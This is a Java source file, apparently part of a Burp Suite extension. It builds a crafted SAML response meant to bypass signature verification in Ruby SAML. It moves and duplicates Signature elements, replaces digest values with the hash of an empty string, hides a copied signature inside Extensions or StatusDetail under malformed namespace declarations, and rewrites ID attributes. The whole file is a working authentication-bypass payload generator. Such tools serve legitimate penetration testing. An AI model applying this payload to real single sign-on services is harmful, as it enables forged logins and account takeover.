package burp.wrappers;

import burp.utilities.helpers.XMLHelpers;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

import static burp.utilities.helpers.Constants.DS_NAMESPACE;
import static burp.utilities.helpers.Constants.XMLNS;

public class RubySAMLVoidWrapper {

    public RubySAMLVoidWrapper() {

    }

    public static String apply(Document document) throws IOException {
        XMLHelpers xmlHelpers = XMLHelpers.getInstance();

        // Step 0: clone
        Document newDoc = (Document) document.cloneNode(true);

        Element newResponse = (Element) newDoc.getElementsByTagNameNS("*", "Response").item(0);
        Element newAssertion = (Element) newDoc.getElementsByTagNameNS("*", "Assertion").item(0);

        // Step 1: Extract Response and Assertion
        if (newResponse == null) {
            throw new IllegalArgumentException("No <Response> element found.");
        }
        if (newAssertion == null) {
            throw new IllegalArgumentException("No <Assertion> element found.");
        }

        Element signatureForResponse = null;
        Element signatureForAssertion = null;

        List<Element> signatureElements = new ArrayList<>();
        NodeList signatureNodes = newDoc.getElementsByTagNameNS("*", "Signature");
        for (int i = 0; i < signatureNodes.getLength(); i++) {
            signatureElements.add((Element) signatureNodes.item(i));
        }

        for (Element sig : signatureElements) {
            NodeList referenceNodes = sig.getElementsByTagNameNS("*", "Reference");
            if (referenceNodes.getLength() == 0) continue;

            Element reference = (Element) referenceNodes.item(0);
            String refURI = reference.getAttribute("URI").substring(1);

            Element target = null;
            NodeList allElements = newDoc.getElementsByTagName("*");
            for (int j = 0; j < allElements.getLength(); j++) {
                Element el = (Element) allElements.item(j);
                if (el.hasAttribute("ID") && el.getAttribute("ID").equals(refURI)) {
                    target = el;
                    break;
                }
            }

            if (target == null) continue;

            if ("Response".equals(target.getLocalName())) {
                signatureForResponse = sig;
            } else if ("Assertion".equals(target.getLocalName())) {
                signatureForAssertion = sig;
            }

            Node parent = sig.getParentNode();
            if (parent != null) {
                parent.removeChild(sig);
            }
        }

        Element sourceSignature = (signatureForAssertion != null) ? signatureForAssertion : signatureForResponse;
        if (sourceSignature == null) throw new IllegalArgumentException("No <Signature> element found.");

        Element sigForAssertion = buildSignatureElement(newDoc, sourceSignature);

        NodeList digestValues = sigForAssertion.getElementsByTagNameNS("*", "DigestValue");
        for (int i = 0; i < digestValues.getLength(); i++) {
            digestValues.item(i).setTextContent(computeDigestFromSignature(sourceSignature));
        }

        Node firstChild = newAssertion.getFirstChild();
        while (firstChild != null && firstChild.getNodeType() != Node.ELEMENT_NODE) {
            firstChild = firstChild.getNextSibling();
        }

        if (firstChild == null || !"Issuer".equals(firstChild.getLocalName())) {
            throw new IllegalArgumentException("Expected <Issuer> as the first child of Assertion");
        }

        newAssertion.insertBefore(sigForAssertion, firstChild.getNextSibling());
        newAssertion.setAttributeNS(XMLNS, "xmlns:example", "31337");

        String namePrefix = sourceSignature.getPrefix();
        String signatureNamespace = sourceSignature.getNamespaceURI();
        // move namespace to the top
        if (namePrefix != null && !namePrefix.isEmpty() && signatureNamespace != null) {
            String xmlnsAttrName = "xmlns:" + namePrefix;

            if (!newResponse.hasAttributeNS(XMLNS, namePrefix)) {
                newResponse.setAttributeNS(
                        XMLNS,
                        xmlnsAttrName,
                        signatureNamespace
                );
            }
        }

        // We can use samlp:Extensions or samlp:Status/samlp:StatusDetail Nodes
        Element status = (Element) newResponse.getElementsByTagNameNS("*", "Status").item(0);
        Element extensions = (Element) newResponse.getElementsByTagNameNS("*", "Extensions").item(0);
        if (extensions == null) {
            String responsePrefix = newResponse.getPrefix();
            String responseNamespace = newResponse.getNamespaceURI();
            String qualifiedName = (responsePrefix != null && !responsePrefix.isEmpty())
                    ? responsePrefix + ":Extensions"
                    : "Extensions";
            Element extension = newDoc.createElementNS(responseNamespace, qualifiedName);
            insertAfter(extension, newResponse.getFirstChild(), newResponse);

            Element reveal = newDoc.createElement("Reveal");
            Element conceal = newDoc.createElement("Conceal");

            reveal.setAttribute("xmlns", DS_NAMESPACE);
            conceal.setAttribute("xml:xmlns", "http://www.w3.org/2000/09/xmldsig_#");
            extension.appendChild(reveal);
            reveal.appendChild(conceal);
            Element newSig = newDoc.createElement("Signature");
            NodeList children = sourceSignature.getChildNodes();

            for (int i = 0; i < children.getLength(); i++) {
                Node imported = newDoc.importNode(children.item(i), true);
                newSig.appendChild(imported);
            }
            conceal.appendChild(newSig);

        } else if (status != null) {
            String statusPrefix = status.getPrefix();
            String statusNamespace = status.getNamespaceURI();

            String qualifiedName = (statusPrefix != null && !statusPrefix.isEmpty())
                    ? statusPrefix + ":StatusDetail"
                    : "StatusDetail";

            Element statusDetail = newDoc.createElementNS(statusNamespace, qualifiedName);

            Element conceal = newDoc.createElement("Conceal");
            Element reveal = newDoc.createElement("Reveal");
            conceal.setAttribute("xmlns", DS_NAMESPACE);
            reveal.setAttribute("xml:xmlns", "http://www.w3.org/2000/09/xmldsig_#");
            conceal.appendChild(reveal);
            Element newSig = newDoc.createElement("Signature");
            NodeList children = sourceSignature.getChildNodes();

            for (int i = 0; i < children.getLength(); i++) {
                Node imported = newDoc.importNode(children.item(i), true);
                newSig.appendChild(imported);
            }
            reveal.appendChild(newSig);

            status.appendChild(statusDetail);

            statusDetail.appendChild(conceal);
        } else {
            throw new IllegalArgumentException("Document doesn't have extensibility objects.");
        }

        if (signatureForAssertion == null) {
            String referenceURI = null;
            NodeList referenceList = sourceSignature.getElementsByTagNameNS("*", "Reference");
            Element referenceElement = (Element) referenceList.item(0);
            if (referenceElement != null && referenceElement.hasAttribute("URI")) {
                referenceURI = referenceElement.getAttribute("URI").substring(1);
            }
            newAssertion.setAttribute("ID", referenceURI);
            newResponse.setAttribute("ID", referenceURI + "ffff");
        }

        return xmlHelpers.getString(newDoc, 0, true);
    }

    private static void insertAfter(Node newNode, Node refNode, Node parent) {
        Node next = refNode.getNextSibling();
        if (next != null) {
            parent.insertBefore(newNode, next);
        } else {
            parent.appendChild(newNode);
        }
    }

    private static Element buildSignatureElement(Document doc, Element sourceSignature) {
        String prefix = sourceSignature.getPrefix();
        String ns = sourceSignature.getNamespaceURI();
        String qualifiedName = (prefix != null && !prefix.isEmpty()) ? prefix + ":Signature" : "Signature";

        Element newSig = doc.createElementNS(ns, qualifiedName);
        if (qualifiedName.equals("Signature")) {
            newSig.setAttributeNS(
                    XMLNS,
                    "xmlns",
                    DS_NAMESPACE
            );
        }
        NodeList children = sourceSignature.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node imported = doc.importNode(children.item(i), true);
            newSig.appendChild(imported);
        }
        return newSig;
    }


    private static String computeDigestFromSignature(Element signatureElement) {
        NodeList digestMethodNodes = signatureElement.getElementsByTagNameNS("*", "DigestMethod");
        if (digestMethodNodes.getLength() == 0) {
            throw new IllegalArgumentException("No <DigestMethod> found in Signature element.");
        }

        Element digestMethod = (Element) digestMethodNodes.item(0);
        String algorithmUri = digestMethod.getAttribute("Algorithm");

        String javaAlgorithm = XMLHelpers.mapXmlDigestAlgorithm(algorithmUri);
        if (javaAlgorithm == null) {
            throw new IllegalArgumentException("Unsupported digest algorithm: " + algorithmUri);
        }

        try {
            MessageDigest digest = MessageDigest.getInstance(javaAlgorithm);
            byte[] hashBytes = digest.digest("".getBytes(java.nio.charset.StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(hashBytes);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Hash algorithm not available: " + javaAlgorithm, e);
        }
    }
}
